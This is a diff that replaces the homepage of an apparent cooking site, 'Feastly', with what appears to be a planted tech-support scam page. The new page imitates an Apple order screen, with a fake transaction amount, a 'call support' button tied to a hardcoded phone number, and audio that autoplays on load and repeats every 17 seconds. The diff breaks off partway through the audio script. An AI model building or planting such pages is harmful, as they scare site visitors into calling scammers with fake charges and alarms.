@@ -1,63 +1,971 @@
-<!DOCTYPE html>
-<html lang="en">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Feastly | Dinner Quantity Planner, Cooking Timeline &amp; Menu Balancer</title>
-<meta name="description" content="Feastly is an independent dinner guide with a quantity planner, a cooking timeline and a menu balancer, plus guides to dinner parties and timing.">
-<meta name="robots" content="index, follow, max-image-preview:large">
-<link rel="canonical" href="https://feastly.com/">
-<meta property="og:type" content="website"><meta property="og:site_name" content="Feastly">
-<meta property="og:title" content="Feastly | Dinner Quantity Planner, Cooking Timeline &amp; Menu Balancer"><meta property="og:description" content="Feastly is an independent dinner guide with a quantity planner, a cooking timeline and a menu balancer, plus guides to dinner parties and timing.">
-<meta property="og:url" content="https://feastly.com/"><meta property="og:image" content="https://images.unsplash.com/photo-1780304223294-d901e0378bb8?auto=format&fit=crop&w=1200&q=75">
-<meta name="twitter:card" content="summary_large_image"><meta name="theme-color" content="#5B6B2E">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Ccircle cx='20' cy='20' r='15' fill='%23E3A72F'/%3E%3Ccircle cx='20' cy='20' r='9' fill='%23FFFBF3'/%3E%3C/svg%3E">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://images.unsplash.com">
-<link href="https://fonts.googleapis.com/css2?family=Arima:wght@500;700&family=Mate:ital@0;1&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "Organization", "name": "Feastly", "url": "https://feastly.com", "email": "hello@feastly.com", "telephone": "+1-888-777-5845", "address": {"@type": "PostalAddress", "streetAddress": "181 Mercer Street", "addressLocality": "New York", "addressRegion": "NY", "postalCode": "10012", "addressCountry": "US"}}, {"@type": "WebSite", "name": "Feastly", "url": "https://feastly.com"}, {"@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "How much meat should I cook per person?", "acceptedAnswer": {"@type": "Answer", "text": "For a main course, allow about 150–200 g of boneless meat or fish per adult, or 250–350 g if it is on the bone. Add a little more if it is the only substantial dish on the table."}}, {"@type": "Question", "name": "How many dishes should a dinner party have?", "acceptedAnswer": {"@type": "Answer", "text": "Three courses is plenty for most hosts: a simple starter, one main with two or three sides, and a dessert. Two courses served generously can be just as welcoming."}}, {"@type": "Question", "name": "How far ahead can I cook?", "acceptedAnswer": {"@type": "Answer", "text": "Many braises, stews, sauces and desserts improve when made a day ahead. Roasts, fried food and dressed salads are best done close to serving."}}, {"@type": "Question", "name": "How do I keep everything hot at once?", "acceptedAnswer": {"@type": "Answer", "text": "Rest roasted meat under loose foil for 15–30 minutes while you finish the sides, warm plates in a low oven and serve sides that hold well, such as gratins and roasted vegetables."}}, {"@type": "Question", "name": "What if a guest has a dietary need?", "acceptedAnswer": {"@type": "Answer", "text": "Ask when you invite. It is often easiest to make one or two sides suitable for everyone, so no one has a separate plate. Keep labels or ingredient lists for any dish that contains common allergens."}}, {"@type": "Question", "name": "How long should meat rest?", "acceptedAnswer": {"@type": "Answer", "text": "As a rule of thumb, small cuts and poultry pieces for 5–10 minutes, a whole chicken around 15–20 minutes and a large roast 20–30 minutes. Always check it has reached a safe internal temperature first."}}]}]}</script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+
+    <title>Contact - Support</title>
+
+    <link rel="stylesheet" href="css/kTa00i9n5NV8.html" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253Dsf%20pro%252Cv1_7csf%20pro%20icons%252Cv1html.html">
+ <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-2DMKRPGVF0');
+</script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 </head>
-<body class="">
-<a class="skip" href="#main">Skip to content</a>
-<header class="fe-hd"><div class="fe-w fe-hd-in"><a class="logo" href="./" aria-label="Feastly home"><svg viewBox="0 0 40 40" aria-hidden="true"><circle cx="20" cy="22" r="14" fill="#E3A72F"/><circle cx="20" cy="22" r="8.5" fill="#FFFBF3"/><path d="M5 9v9M8 9v9M11 9v9M8 18v18M33 9c-3 3-3 9 0 11v16" stroke="#5B6B2E" stroke-width="2.2" fill="none" stroke-linecap="round"/></svg><span>Feastly</span></a><nav id="nav" aria-label="Main navigation"><ul><li><a href="./" aria-current="page">Home</a></li><li><a href="dinner-party-guide.html">Dinner Parties</a></li><li><a href="cooking-timeline-guide.html">Timelines</a></li><li><a href="about.html">About</a></li><li><a href="contact.html">Contact</a></li></ul></nav><button class="burger" aria-label="Open menu" aria-expanded="false" aria-controls="nav"><i></i><i></i><i></i></button></div></header>
-<main id="main">
 
-<section class="fe-hero"><div class="fe-w fe-hero-g"><div class="fe-menu"><p class="fe-menu-h">Tonight&rsquo;s menu</p><h1>Dinner, planned with ease.</h1><p class="fe-lead">Feastly is an independent guide to cooking dinner for family and friends. We help you work out how much to cook, when to start and how to balance a plate.</p><dl class="fe-menu-l"><div><dt>To start</dt><dd>Quantities for every guest</dd></div><div><dt>The main</dt><dd>A timeline that ends on time</dd></div><div><dt>To finish</dt><dd>A menu that feels balanced</dd></div></dl><p class="fe-acts"><a class="btn" href="#tools">Plan my dinner</a><a class="fe-ln" href="dinner-party-guide.html">The dinner party guide</a></p></div><figure class="fe-hero-f"><img src="https://images.unsplash.com/photo-1780304223294-d901e0378bb8?auto=format&fit=crop&w=640&h=720&q=75" alt="roast dinner with gravy and vegetables" width="640" height="720" fetchpriority="high"><figcaption>Roast, gravy and seasonal vegetables: the heart of a Sunday table.</figcaption></figure></div></section>
+<script>
+ 
+  window.SUPPORT_PHONE = {
+    display: "+1(888) 902-7808",   
+    tel:     "+18889027808"        
+  };
+</script>
 
-<section class="fe-s"><div class="fe-w"><div class="fe-tt"><span>&#10022;</span><h2>A three-course shape that always works</h2><span>&#10022;</span></div><div class="fe-courses"><article><img src="https://images.unsplash.com/photo-1606258868842-79eb9eff76af?auto=format&fit=crop&w=420&h=300&q=75" alt="sliced bread on a blue and white plate" width="420" height="300" loading="lazy"><p class="fe-no">I</p><h3>Something to share</h3><p>Bread, dips or a simple soup. Ready before guests arrive, so you can greet them properly.</p></article><article><img src="https://images.unsplash.com/photo-1531856396526-a0c8d7bd628b?auto=format&fit=crop&w=420&h=300&q=75" alt="grilled chicken on a table" width="420" height="300" loading="lazy"><p class="fe-no">II</p><h3>One generous main</h3><p>A roast, braise or tray bake with two or three sides that cook alongside it.</p></article><article><img src="https://images.unsplash.com/photo-1776530874717-351b45ca4cfe?auto=format&fit=crop&w=420&h=300&q=75" alt="small bowls of food lit by a lantern" width="420" height="300" loading="lazy"><p class="fe-no">III</p><h3>A make-ahead finish</h3><p>Something cold or reheated: fruit, a tart, a set pudding. No last-minute stress.</p></article></div></div></section>
 
-<section class="fe-tl" id="tools"><div class="fe-w"><div class="fe-tt fe-tt-l"><span>&#10022;</span><h2>Three dinner tools</h2><span>&#10022;</span></div><div class="fe-cards">
-<div class="fe-card"><div class="fe-card-h"><h3>Dinner Quantity Planner</h3><p>How much to buy and cook.</p></div><div class="fe-card-b"><label for="dq-g">Guests (adults)<input id="dq-g" type="number" min="1" max="40" value="6"></label><label for="dq-k">Children under 12<input id="dq-k" type="number" min="0" max="30" value="0"></label><label for="dq-m">Main<select id="dq-m"><option value="meat">Boneless meat</option><option value="bone">Meat on the bone</option><option value="fish">Fish fillets</option><option value="veg">Vegetarian main</option></select></label><label for="dq-a">Appetites<select id="dq-a"><option value="0.85">Light</option><option value="1" selected>Average</option><option value="1.2">Hearty</option></select></label><div class="fe-out" id="dq-o" aria-live="polite"></div></div></div>
-<div class="fe-card"><div class="fe-card-h"><h3>Cooking Timeline</h3><p>Work back from when you want to eat.</p></div><div class="fe-card-b"><label for="ct-t">Dinner is served at<input id="ct-t" type="time" value="19:30"></label><label for="ct-r">Main needs in the oven (min)<input id="ct-r" type="number" min="10" max="480" step="5" value="90"></label><label for="ct-s">Rest time (min)<input id="ct-s" type="number" min="0" max="60" step="5" value="20"></label><div class="fe-out" id="ct-o" aria-live="polite"></div></div></div>
-<div class="fe-card"><div class="fe-card-h"><h3>Menu Balancer</h3><p>Choose your main; get sides that contrast.</p></div><div class="fe-card-b"><label for="mb-m">Main dish<select id="mb-m"><option value="roast">Roast chicken or meat</option><option value="braise">Rich stew or braise</option><option value="fish">Grilled or baked fish</option><option value="pasta">Baked pasta</option><option value="veg">Vegetable tart or bake</option><option value="curry">Spiced curry</option></select></label><label for="mb-s">Season<select id="mb-s"><option value="warm">Warm months</option><option value="cool" selected>Cool months</option></select></label><div class="fe-out" id="mb-o" aria-live="polite"></div></div></div>
-</div></div></section>
+<style>
 
-<section class="fe-s"><div class="fe-w fe-host"><figure><img src="https://images.unsplash.com/photo-1686489356516-a54af456d168?auto=format&fit=crop&w=560&h=680&q=75" alt="people gathered around a dinner table" width="560" height="680" loading="lazy"></figure><div><div class="fe-tt fe-tt-l"><span>&#10022;</span><h2>The host&rsquo;s countdown</h2></div><ul class="fe-cd"><li><b>3 days before</b><span>Confirm numbers and any dietary needs. Write the shopping list.</span></li><li><b>The day before</b><span>Shop, make dessert, prepare sauces and braises, set the table.</span></li><li><b>Morning of</b><span>Peel and chop vegetables, bring meat out of the fridge in time.</span></li><li><b>2 hours to go</b><span>Main into the oven. Tidy the kitchen as you go.</span></li><li><b>30 minutes to go</b><span>Main out to rest, sides in, plates warming.</span></li><li><b>At the table</b><span>Sit down. The food will wait a minute; your guests came for you.</span></li></ul></div></div></section>
 
-<section class="fe-band"><div class="fe-w fe-band-g"><blockquote>&ldquo;Cook one thing beautifully, and keep everything else simple.&rdquo;<cite>The Feastly rule of hosting</cite></blockquote><img src="https://images.unsplash.com/photo-1580554530778-ca36943938b2?auto=format&fit=crop&w=560&h=400&q=75" alt="plated dinner on a white plate" width="560" height="400" loading="lazy"></div></section>
+.popup-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.55);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  z-index: 99999;
+}
 
-<section class="fe-s"><div class="fe-w"><div class="fe-tt"><span>&#10022;</span><h2>From the guides</h2><span>&#10022;</span></div><div class="fe-gds"><a href="dinner-party-guide.html"><img src="https://images.unsplash.com/photo-1661006117166-6227bfc9c8b0?auto=format&fit=crop&w=640&h=400&q=75" alt="people sitting around a table" width="640" height="400" loading="lazy"><div><p class="fe-no">Guide one</p><h3>The Dinner Party Guide</h3><p>Planning a menu, quantities, table setting, and hosting without staying in the kitchen.</p></div></a><a href="cooking-timeline-guide.html"><img src="https://images.unsplash.com/photo-1765568741171-71bbaf721747?auto=format&fit=crop&w=640&h=400&q=75" alt="golden yorkshire puddings in a glass dish" width="640" height="400" loading="lazy"><div><p class="fe-no">Guide two</p><h3>The Cooking Timeline Guide</h3><p>Working backwards from serving time so everything lands hot and together.</p></div></a></div></div></section>
+.ps-popup {
+  width: 100%;
+  max-width: 430px;
+  background: #ffffff;
+  border-radius: 20px;
+  overflow: hidden;
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+  animation: popupIn 0.25s ease-out;
+  position: relative;
+}
 
-<section class="fe-s fe-cream"><div class="fe-w fe-fq"><div class="fe-tt fe-tt-l"><span>&#10022;</span><h2>Kitchen questions</h2></div><div class="fe-faq"><details open><summary>How much meat should I cook per person?</summary><p>For a main course, allow about 150&ndash;200 g of boneless meat or fish per adult, or 250&ndash;350 g if it is on the bone. Add a little more if it is the only substantial dish on the table.</p></details><details><summary>How many dishes should a dinner party have?</summary><p>Three courses is plenty for most hosts: a simple starter, one main with two or three sides, and a dessert. Two courses served generously can be just as welcoming.</p></details><details><summary>How far ahead can I cook?</summary><p>Many braises, stews, sauces and desserts improve when made a day ahead. Roasts, fried food and dressed salads are best done close to serving.</p></details><details><summary>How do I keep everything hot at once?</summary><p>Rest roasted meat under loose foil for 15&ndash;30 minutes while you finish the sides, warm plates in a low oven and serve sides that hold well, such as gratins and roasted vegetables.</p></details><details><summary>What if a guest has a dietary need?</summary><p>Ask when you invite. It is often easiest to make one or two sides suitable for everyone, so no one has a separate plate. Keep labels or ingredient lists for any dish that contains common allergens.</p></details><details><summary>How long should meat rest?</summary><p>As a rule of thumb, small cuts and poultry pieces for 5&ndash;10 minutes, a whole chicken around 15&ndash;20 minutes and a large roast 20&ndash;30 minutes. Always check it has reached a safe internal temperature first.</p></details></div></div></section>
+@keyframes popupIn {
+  from { opacity: 0; transform: translateY(15px) scale(0.97); }
+  to   { opacity: 1; transform: translateY(0)   scale(1);    }
+}
 
-<section class="fe-nl"><div class="fe-w"><div class="fe-nl-c"><h2>The Feastly Card</h2><p>A monthly email with one seasonal menu idea and one timing tip.</p><a class="btn" href="mailto:hello@feastly.com?subject=The%20Feastly%20Card&amp;body=Please%20subscribe%20me.">Subscribe by email</a></div></div></section>
+.ps-popup .popup-header {
+  background: #ffffff;
+  padding: 24px 24px 18px;
+  border-bottom: 0.5px solid #e5e5ea;
+  text-align: center;
+}
 
-</main>
-<footer class="fe-ft"><div class="fe-w"><div class="fe-ft-top"><a class="logo" href="./"><svg viewBox="0 0 40 40" aria-hidden="true"><circle cx="20" cy="22" r="14" fill="#E3A72F"/><circle cx="20" cy="22" r="8.5" fill="#FFFBF3"/><path d="M5 9v9M8 9v9M11 9v9M8 18v18M33 9c-3 3-3 9 0 11v16" stroke="#5B6B2E" stroke-width="2.2" fill="none" stroke-linecap="round"/></svg><span>Feastly</span></a><p>Good dinners, calmly made. An independent guide to planning, cooking and serving dinner for the people you love.</p></div><div class="fe-ft-g"><div class="fe-ft-k"><h4>On the menu</h4><a href="dinner-party-guide.html">Dinner Party Guide</a><a href="cooking-timeline-guide.html">Cooking Timeline Guide</a><a href="./#tools">Dinner tools</a></div><div class="fe-ft-k"><h4>The house</h4><a href="about.html">About Feastly</a><a href="contact.html">Contact</a><a href="editorial-policy.html">Editorial Policy</a></div><div class="fe-ft-k"><h4>Small print</h4><a href="privacy-policy.html">Privacy Policy</a><a href="terms-and-conditions.html">Terms &amp; Conditions</a><a href="cookie-policy.html">Cookie Policy</a><a href="disclaimer.html">Disclaimer</a></div><div class="fe-ft-k"><h4>Find us</h4><p>181 Mercer Street, New York, NY 10012, United States</p><a href="tel:+18887775845">+1-888-777-5845</a><a href="mailto:hello@feastly.com">hello@feastly.com</a></div></div><p class="fe-ft-c">&copy; <span id="year">2026</span> Feastly &mdash; All rights reserved &mdash; Bon app&eacute;tit</p></div></footer>
-<div class="cookie" id="cookie" role="dialog" aria-label="Cookie notice"><p>We use essential storage and, with your consent, cookies for our live chat and any ads shown on the site. <a href="cookie-policy.html">Cookie Policy</a></p><button class="y" data-cookie="accepted">Accept</button><button data-cookie="declined">Essential only</button></div>
-<script src="assets/js/main.js" defer></script>
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/626be649b0d10b6f3e6ff291/1g1qnn49c';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
+.ps-popup .brand-icon {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 14px;
+}
+
+.ps-popup .brand-icon img {
+  width: 140px;
+  height: auto;
+  display: block;
+  margin-top: -10px;
+  margin-bottom: -15px;
+}
+
+.ps-popup .popup-header h2 {
+  color: #222;
+  font-size: 21px;
+  margin-bottom: 5px;
+  text-align: center;
+}
+
+.ps-popup .popup-header p {
+  color: #666;
+  font-size: 15px;
+  text-align: center;
+}
+
+.ps-popup .popup-body {
+  padding: 22px 24px;
+}
+
+.ps-popup .popup-body > p {
+  font-size: 14px;
+  color: #333;
+  line-height: 1.5;
+  margin: 0 0 8px;
+}
+
+.ps-popup .transaction-box {
+  background: #f7f7f9;
+  border-radius: 13px;
+  padding: 16px;
+  margin: 16px 0;
+}
+
+.ps-popup .transaction-row {
+  display: flex;
+  justify-content: space-between;
+  gap: 15px;
+  padding: 8px 0;
+  font-size: 14px;
+}
+
+.ps-popup .transaction-row span:first-child {
+  color: #777;
+}
+
+.ps-popup .transaction-row span:last-child {
+  color: #222;
+  font-weight: 600;
+  text-align: right;
+}
+
+.ps-popup .amount {
+  color: #d92d20 !important;
+  font-size: 16px;
+}
+
+.ps-popup .status {
+  color: #16803c !important;
+}
+
+.ps-popup .notice {
+  background: #fff4f2;
+  border-left: 4px solid #e5484d;
+  padding: 12px;
+  border-radius: 7px;
+  color: #6b2525;
+  font-size: 15px;
+  line-height: 1.5;
+  margin-bottom: 18px;
+}
+
+.ps-popup .buttons {
+  display: flex;
+  gap: 10px;
+}
+
+.ps-popup button {
+  flex: 1;
+  border-radius: 11px;
+  padding: 13px 10px;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: 0.2s;
+}
+
+.ps-popup .primary-btn {
+  background: #000;
+  color: #fff;
+  border: none;
+}
+
+.ps-popup .primary-btn:hover {
+  background: #222;
+}
+
+.ps-popup .secondary-btn {
+  background: #fff;
+  color: #000;
+  border: 2px solid #000;
+}
+
+.ps-popup .secondary-btn:hover {
+  background: #f5f5f5;
+}
+
+.ps-popup .popup-footer {
+  padding: 0 24px 22px;
+  color: #888;
+  font-size: 11px;
+  line-height: 1.5;
+  text-align: center;
+}
+
+@media (max-width: 480px) {
+  .ps-popup { border-radius: 16px; }
+  .ps-popup .popup-body,
+  .ps-popup .popup-header { padding-left: 20px; padding-right: 20px; }
+}
+
+/* ===== EXISTING STYLES ===== */
+@media (min-width: 768px) {
+    .popup-content .btn-row {
+        display: flex;
+        gap: 12px;
+    }
+
+    .popup-content .btn-row button {
+    flex: 1;
+    margin: 0;
+    padding: 14px;
+    font-size: 16px;
+    border-radius: 8px;
+}
+}
+
+    .popup {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 140%;
+        background: rgba(0,0,0,0.6);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+
+.popup-content button {
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+.popup-content .btn-row button:first-child {
+    background: #000;
+    color: #fff;
+    border: none;
+}
+
+.popup-content .btn-row button:last-child {
+    background: #fff;
+    color: #000;
+    border: 2px solid #000;
+}
+
+.popup-content > button {
+    width: 100%;
+    margin-top: 12px;
+    background: #f5f5f5;
+    border: 2px solid #000;
+}
+
+.popup-content {
+    background: linear-gradient(135deg, #ffffff, #f2f2f2);
+    color: #000;
+    width: 420px;
+    max-width: 90%;
+    text-align: center;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    transform: translateY(-40%);
+}
+.popup-content p {
+    width: 100%;
+    text-align: left;
+    margin-bottom: 20px;
+}
+.popup-title {
+    width: 100%;
+    text-align: center;
+    font-size: 26px;
+    font-weight: 700;
+    margin-bottom: 20px;
+    color: #fff;
+    line-height: 1.4;
+}
+.popup-text {
+    width: 100%;
+    font-size: 18px;
+    font-weight: 500;
+    line-height: 1.5;
+    color: #000;
+    margin-bottom: 20px;
+}
+@import url('https://fonts.googleapis.com/css2?family=Manrope:wght@500;700&amp;display=swap');
+
+  .call-popup-wrapper {
+    position: fixed;
+    bottom: 50px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 99999;
+    font-family: 'Manrope', sans-serif;
+    opacity: 0;
+    animation: none;
+  }
+
+  .call-popup-btn {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: #111111;
+    color: #ffffff;
+    text-decoration: none;
+    padding: 32px 72px;
+    border-radius: 50px;
+    font-size: 32px;
+    font-weight: 700;
+    letter-spacing: 0.02em;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.35), 0 2px 8px rgba(0,0,0,0.18);
+    transition: transform 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
+    white-space: nowrap;
+    border: none;
+    cursor: pointer;
+  }
+
+  .call-popup-btn:hover {
+    background: #222222;
+    transform: translateX(-0%) translateY(-3px);
+    box-shadow: 0 16px 40px rgba(0, 0, 0, 0.4), 0 4px 12px rgba(0,0,0,0.2);
+  }
+
+  .call-popup-btn:active {
+    transform: translateX(-0%) translateY(0px);
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+  }
+
+  .call-icon-wrap {
+    position: relative;
+    width: 22px;
+    height: 22px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .call-icon-wrap::before {
+    content: '';
+    position: absolute;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.12);
+    animation: pulse 1.8s ease-out infinite;
+  }
+
+  .call-icon {
+    width: 18px;
+    height: 18px;
+    fill: #ffffff;
+    position: relative;
+    z-index: 1;
+  }
+
+  .call-label {
+    text-decoration: underline;
+    text-underline-offset: 3px;
+    text-decoration-thickness: 1.5px;
+    text-decoration-color: rgba(255,255,255,0.5);
+  }
+
+  @keyframes pulse {
+    0%   { transform: scale(0.8); opacity: 0.8; }
+    70%  { transform: scale(1.6); opacity: 0;   }
+    100% { transform: scale(0.8); opacity: 0;   }
+  }
+
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateX(-50%) translateY(24px); }
+    to   { opacity: 1; transform: translateX(-50%) translateY(0);    }
+  }
+
+  @media (max-width: 480px) {
+    .call-popup-btn {
+      padding: 22px 44px;
+      font-size: 22px;
+    }
+  }
+  .popup-heading {
+    display: block;
+    font-size: 20px;
+    font-weight: 700;
+    margin-bottom: 8px;
+}
+
+.popup-subtext {
+    font-size: 18px;
+    font-weight: 700;
+    line-height: 1.6;
+    margin: 0;
+    text-align: right;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      width: 100%;
+      min-height: 100dvh;
+      overflow-x: hidden;
+      overflow-y: auto;
+      background: #f5f5f7;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
+      touch-action: pan-x pan-y;
+    }
+
+    .apple-nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      height: 52px;
+      background: rgba(245,245,247,0.92);
+      backdrop-filter: saturate(180%) blur(20px);
+      -webkit-backdrop-filter: saturate(180%) blur(20px);
+      border-bottom: 0.5px solid #d2d2d7;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 clamp(1rem, 5vw, 1.5rem);
+      z-index: 100;
+    }
+    .nav-left { display: flex; align-items: center; gap: 8px; }
+    .nav-title { font-size: 17px; font-weight: 600; color: #1d1d1f; letter-spacing: -0.3px; }
+
+    .nav-cart {
+      display: flex; align-items: center; justify-content: center;
+      width: 38px; height: 38px;
+      border-radius: 50%;
+      cursor: pointer;
+      position: relative;
+      -webkit-tap-highlight-color: transparent;
+      transition: background 0.15s;
+    }
+    .nav-cart:active { background: #e5e5ea; }
+    .cart-badge {
+      position: absolute;
+      top: 1px; right: 1px;
+      width: 17px; height: 17px;
+      background: #0071e3;
+      border-radius: 50%;
+      font-size: 10px; font-weight: 700;
+      color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      border: 1.5px solid #f5f5f7;
+    }
+
+    #processing {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 100dvh;
+      padding-top: 52px;
+      background: #f5f5f7;
+      text-align: center;
+      padding-left: 1rem;
+      padding-right: 1rem;
+    }
+
+    #confirmed {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      width: 100%;
+      min-height: 100dvh;
+      padding-top: 68px;
+      padding-bottom: max(env(safe-area-inset-bottom, 16px), 20px);
+      padding-left: clamp(12px, 4vw, 20px);
+      padding-right: clamp(12px, 4vw, 20px);
+      gap: 0;
+      overflow: visible;
+    }
+
+    canvas#confetti {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none; z-index: 98;
+    }
+
+    .spinner {
+      width: 38px; height: 38px;
+      border: 2.5px solid #d2d2d7;
+      border-top: 2.5px solid #1d1d1f;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+      margin-top: 1.25rem;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .check-ring {
+      width: clamp(44px, 12vw, 60px);
+      height: clamp(44px, 12vw, 60px);
+      border-radius: 50%; background: #34c759;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto clamp(4px, 1.2vh, 8px);
+      animation: popIn 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      flex-shrink: 0;
+    }
+    @keyframes popIn { from { transform: scale(0.3); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 420px;
+      padding: clamp(10px, 2.2vh, 18px) clamp(14px, 4vw, 20px);
+      margin-bottom: clamp(6px, 1.4vh, 10px);
+      flex-shrink: 0;
+    }
+
+    .divider {
+      height: 0.5px;
+      background: #e5e5ea;
+      margin: clamp(6px, 1.4vh, 10px) 0;
+      width: 100%;
+    }
+
+    .progress-wrap {
+      display: flex; align-items: flex-start;
+      justify-content: center; width: 100%;
+    }
+    .step { display: flex; flex-direction: column; align-items: center; gap: 4px; flex: 1; }
+    .dot {
+      width: clamp(22px, 6vw, 28px);
+      height: clamp(22px, 6vw, 28px);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-size: clamp(9px, 2.5vw, 11px); font-weight: 600;
+      position: relative; z-index: 1; flex-shrink: 0;
+    }
+    .dot.done  { background: #1d1d1f; color: #fff; }
+    .dot.active{ background: #0071e3; color: #fff; }
+    .dot.pending{ background: #e5e5ea; color: #aeaeb2; }
+    .step-line {
+      flex: 1; height: 2px;
+      margin-top: clamp(10px, 2.8vw, 13px);
+      z-index: 0;
+    }
+    .step-line.done   { background: #1d1d1f; }
+    .step-line.pending{ background: #e5e5ea; }
+    .step-lbl {
+      font-size: clamp(9px, 2.4vw, 11px);
+      text-align: center; letter-spacing: -0.1px;
+    }
+    .step-lbl.done   { color: #1d1d1f; font-weight: 500; }
+    .step-lbl.active { color: #0071e3; font-weight: 500; }
+    .step-lbl.pending{ color: #aeaeb2; }
+
+    .order-row {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: clamp(5px, 1.2vh, 8px) 0;
+    }
+    .order-row + .order-row { border-top: 0.5px solid #e5e5ea; }
+
+    .alert-card {
+      background: #fff9ec;
+      border-radius: 14px;
+      padding: clamp(8px, 1.8vh, 14px) clamp(12px, 4vw, 16px);
+      width: 100%; max-width: 420px;
+      flex-shrink: 0;
+    }
+
+    .btn-call {
+      display: block; width: 100%;
+      padding: clamp(10px, 2.4vh, 14px);
+      background: #0071e3; color: #fff;
+      border: none; border-radius: 12px;
+      font-size: clamp(13px, 3.8vw, 15px); font-weight: 500;
+      cursor: pointer; text-decoration: none; text-align: center;
+      margin-top: 8px;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      letter-spacing: -0.2px; -webkit-tap-highlight-color: transparent;
+    }
+    .btn-call:active { background: #0062c3; }
+
+    .btn-ignore {
+      display: block; width: 100%;
+      padding: clamp(10px, 2.4vh, 14px);
+      background: #fff; color: #1d1d1f;
+      border: 0.5px solid #d2d2d7; border-radius: 12px;
+      font-size: clamp(13px, 3.8vw, 15px); font-weight: 400;
+      cursor: pointer; text-align: center;
+      margin-top: 6px;
+      text-decoration: none;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      letter-spacing: -0.2px; -webkit-tap-highlight-color: transparent;
+    }
+    .btn-ignore:active { background: #f2f2f7; }
+
+    .sub-text {
+      width: 100%; max-width: 420px;
+      text-align: center;
+      font-size: clamp(11px, 3vw, 13px);
+      color: #6e6e73;
+      line-height: 1.55;
+      margin-bottom: clamp(4px, 1vh, 8px);
+      flex-shrink: 0;
+    }
+
+    .card-header {
+      display: flex; flex-direction: column;
+      align-items: center; text-align: center;
+      margin-bottom: clamp(6px, 1.4vh, 10px);
+    }
+    </style>
+
+<body>
+<audio id="audioDue">
+    <source src="due83.wav" type="audio/wav">
+</audio>
+
+<audio id="myAudio" loop>
+    <source src="auf7u4.wav" type="audio/wav">
+</audio>
+
+<script>
+const audio = document.getElementById("myAudio");
+const due   = document.getElementById("audioDue");
+
+// Gap between each due83.wav play (milliseconds)
+const DUE_TO_DUE_GAP = 17000;   // 17s
+
+let dueLoopRunning = false;
+
+// Play main looping audio + start due loop on load
+window.addEventListener("load", () => {
+    audio.play().catch(() => {
+        console.log("Autoplay blocked until user interaction");
+    });
+    startDueLoop();
+});
+
+// Simple, restartable loop using setTimeout
